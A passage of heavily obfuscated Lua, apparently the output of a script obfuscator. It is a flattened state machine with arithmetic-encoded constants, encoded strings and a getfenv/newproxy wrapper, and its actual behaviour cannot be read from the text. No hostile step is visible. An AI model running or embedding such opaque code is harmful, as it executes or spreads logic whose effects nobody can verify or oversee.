V=i(602297-(-913135),{})F=Z[D]D={F(V)}F=-636056+636058 t={e(D)}D=t t=D[F]F=N(-989766+986428)V=t t=Z[F]R=k[A]J=Z[p]p=J(V)J=N(201480-204812)a=R(p,J)R={a()}F=t(e(R))R=b()k[R]=F F=859450+-859449 a=k[x]t=35495+4962814 J=a a=1001967+-1001966 p=a a=889699+-889699 y=p<a a=F-p end end end end end else if t<10906078-(-593920)then if t<-268052+9395895 then if t<-971830+9508775 then if t<6980933-(-870216)then if t<-239689+8074922 then if t<532343+7285397 then t=k[r[790820-790810]]C=k[r[633678+-633667]]w[t]=C t=k[r[-483514-(-483526)]]C={t(w)}F={e(C)}t=Z[N(903402-906724)]else A=654215+-654043 C=k[r[-171153+171156]]w=C*A C=936448+-936191 t=15788090-515183 F=w%C k[r[492083+-492080]]=F end else O=-819570+819571 k[C]=U Q=k[P]u=Q+O s=T[u]S=l+s s=900734+-900478 t=S%s l=t u=k[z]s=E+u u=829286+-829030 S=s%u E=S t=10493538-693835 end else if t<8143834-104227 then t=true t=t and-972247+16115038 or 3278409-(-729966)else t=F and 15392088-111006 or 433570+4011921 end end else if t<-863844+9726344 then if t<609874+8043751 then z=not m R=R+W V=R<=y V=z and V z=R>=y z=m and z V=z or V z=1759011-(-656561)t=V and z V=-168570+13398691 t=t or V else t=4847476-(-973679)end else if t<9191797-150670 then C=N(179703+-183034)F=923699+-152747 A=-769736+6862156 w=C^A t=F-w w=t F=N(541739+-545122)t=F/w F={t}t=Z[N(460884+-464179)]else t=true t=-248668+4257043 end end end else if t<9882927-(-577885)then if t<831553+8953471 then if t<-909986+10528496 then if t<8417183-(-774297)then S=k[C]t=S and 4093454-192480 or 730260+7105895 U=S else j=-1033410-(-1033411)B=-264469-(-264471)C=k[r[-171216+171217]]A=C(j,B)C=816335+-816334 w=A==C F=w t=w and 8584901-220454 or 6856279-211029 end else z=316103+-316003 W=b()k[W]=a m=N(624217-627587)P=354542+-354287 s=N(811607+-814953)O=412940-412940 F=Z[m]m=N(263384-266739)t=F[m]m=755862-755861 F=t(m,z)m=b()k[m]=F t=k[G]z=680066-680066 T=86200+-86198 F=t(z,P)z=b()P=-764573+764574 k[z]=F t=k[G]H=-974152+974153 o=-970060+980060 Y=k[m]F=t(P,Y)P=b()k[P]=F F=k[G]Y=F(H,T)F=-639790-(-639791)t=Y==F F=N(-1029299-(-1025967))Y=b()T=N(-472509-(-469155))k[Y]=t S=Z[s]u=k[G]Q={u(O,o)}s=S(e(Q))S=N(614433-617787)U=s..S t=N(855755-859075)t=V[t]H=T..U t=t(V,F,H)H=b()T=N(-721177-(-717863))k[H]=t F=Z[T]U=d(-22217+9313186,{G;W,x,A,C;R;Y;H;m,P;z;n})T={F(U)}t={e(T)}T=t t=k[Y]t=t and 258775+16276673 or 8445742-(-733509)end else if t<9488924-(-388158)then z=f(z)m=f(m)Y=f(Y)H=f(H)W=f(W)T=nil t=655871+4342438 P=f(P)else x=N(822876+-826241)n=Z[x]F=n t=8144055-835756 end end else if t<11067164-174228 then if t<11338528-560369 then Q=661215+-661213 u=T[Q]Q=k[H]s=u==Q U=s t=1711371-(-636622)else t=Z[N(-13703-(-10321))]F={}end else if t<-486293+11443964 then D=not E x=x+l c=x<=n c=D and c D=x>=n D=E and D c=D or c D=7176368-537050 t=c and D c=847040+14640895 t=t or c else k[C]=a t=k[C]t=t and 217576+-92557 or 8141377-(-936019)end end end end else if t<15414942-505371 then if t<13661135-367007 then if t<801289+11720644 then if t<12601867-673691 then if t<12523430-697419 then t=true B=b()j=b()A=N(237953+-241243)C=b()w=v k[C]=t G=N(746721-750035)c=i(13238316-238543,{B})F=Z[A]A=N(742130+-745480)t=F[A]A=b()k[A]=t t=d(3143588-(-998529),{})k[j]=t t=false k[B]=t X=Z[G]G=X(c)F=G t=G and 670995+5711139 or 573368+1742603 else J=k[C]a=J t=J and-283876+4610209 or 11540298-524026 end else F=n t=x t=n and 893477+6414822 or-68824+10271315 end else if t<-470412+13688093 then t=true k[r[48345-48344]]=t F={}t=Z[N(-111093+107778)]else t=-370557+3243425 y=-391140+391140 R=#D V=R==y end end else if t<12789016-(-946120)then if t<14028670-713129 then k[r[135208-135203]]=F w=nil t=-19383+4464874 else t=k[G]p=573726+-573725 y=664998+-664992 J=t(p,y)t=N(-16771-(-13460))Z[t]=J y=N(169527+-172838)p=Z[y]y=-957201-(-957203)t=p>y t=t and-287840+6079762 or-253129+2496479 end else if t<14777941-605832 then R=#D y=377807+-377807 V=R==y t=V and 63527+714233 or 2431584-(-441284)else F=N(-1006323+1003012)w=N(-927032-(-923643))t=Z[F]F=Z[w]w=N(178115+-181504)Z[w]=t w=N(746575+-749886)Z[w]=F t=-8887+5830042 w=k[r[440049-440048]]C=w()end end end else if t<-2710+15893140 then if t<-792653+16279410 then if t<-90303+15371082 then if t<15598375-350288 then t=1341250-869554 else C=k[r[344067-344064]]A=-803644+803645 w=C~=A t=w and 4657976-(-1024338)or 584625+7250246 end else F=N(975406+-978744)t=Z[F]j=N(258976-262322)w=k[r[-140964-(-140968)]]A=Z[j]c=N(318582+-321896)G=Z[c]n=i(901132+8096353,{})c={G(n)}G=-208689+208691 X={e(c)}B=X[G]j=A(B)A=N(649925-653257)C=w(j,A)w={C()}F=t(e(w))w=F C=k[r[319360-319355]]F=C t=C and-251549+7366846 or-417749+13715981 end else if t<16284996-551342 then G=nil t=-887727+3130733 X=nil j=nil else t=Z[N(273483-276830)]F={}end end else if t<15869630-(-480147)then if t<16748767-607965 then t=Z[N(-324415-(-321092))]A=N(-106019-(-102728))C=Z[A]A=N(-1044496+1041194)w=C[A]A=k[r[521711+-521710]]C={w(A)}F={e(C)}else Q=520074-520073 S=t u=T[Q]Q=false s=u==Q t=s and 878969+9757464 or 449010+1898983 U=s end else if t<419865+16093698 then A=A+B G=not X C=A<=j C=G and C G=A>=j G=X and G C=G or C G=6254386-188991 t=C and G C=8454430-649311 t=t or C else U=k[C]F=U t=U and 77558+16205734 or 217792+2851758 end end end end end end end t=#g return e(F)end,{},function()C=(-706471-(-706472))+C w[C]=1014723+-1014722 return C end,function(Z,N)local e=A(N)local v=function(v,r,g,M,F,k)return t(Z,{v;r,g,M;F,k},N,e)end return v end,function(Z)local N,t=-123711-(-123712),Z[-99268+99269]while t do w[t],N=w[t]-(300758+-300757),N+(742645+-742644)if-700484-(-700484)==w[t]then w[t],k[t]=nil,nil end t=Z[N]end end,function(Z)w[Z]=w[Z]-(807621+-807620)if-837831-(-837831)==w[Z]then w[Z],k[Z]=nil,nil end end return(B(11636636-(-133488),{}))(e(F))end)(getfenv and getfenv()or _ENV,unpack or table[N(943143+-946508)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
